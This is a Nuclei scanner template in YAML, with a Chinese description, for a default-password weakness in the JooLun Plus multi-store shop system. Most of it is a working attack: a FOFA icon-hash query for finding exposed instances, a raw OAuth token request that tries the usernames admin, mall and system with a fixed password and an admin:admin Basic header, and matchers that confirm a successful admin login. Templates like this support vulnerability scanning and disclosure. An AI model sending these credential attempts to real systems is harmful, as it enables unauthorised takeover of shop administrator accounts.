id: JooLun-Plus-default-password

info:
  name: JooLun-Plus-default-password
  author: linfeng7z
  severity: high
  description: JooLun Plus多店版采用JAVA语言开发，结合线下流行的后端技术Sping Cloud微服务前后端分离技术+前端技术Uniapp打造的一款集B2C、SAAS多租户、多商户（多店铺）等商业模式于一体的多商户（多店铺）商城系统；目前已有小程序商城、移动端H5商城、APP商城（android/ios端）、APP商户端（android/ios端）、商城PC端等主流终端；可配置支付宝、微信服务商收款。JooLun plus多店版系统在设计上存在多个管理员默认口令为弱密码，攻击者可通过该漏洞获取web管理员权限。影响数量1000+。
  tags: JooLun,default-password
  metadata:
    fofa-qeury: icon_hash="1954374380"
    veified: true

http:
  - raw:
      - |
        POST /auth/oauth/token?username={{username}}&password=tjR%2BB82HD%2FzECGt%2F1lrqoQ%3D%3D&randomStr=14801714392134944&code=&grant_type=password&scope=server HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/plain, */*
        Authorization: Basic YWRtaW46YWRtaW4=
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
        Accept-Language: zh-CN,zh;q=0.9

    payloads:
      username:
        - admin
        - mall
        - system
    attack: batteringram

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'invalid_exception'
          - '验证码不合法'
        condition: or
        negative: true

      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, 'Copyright')"
        condition: and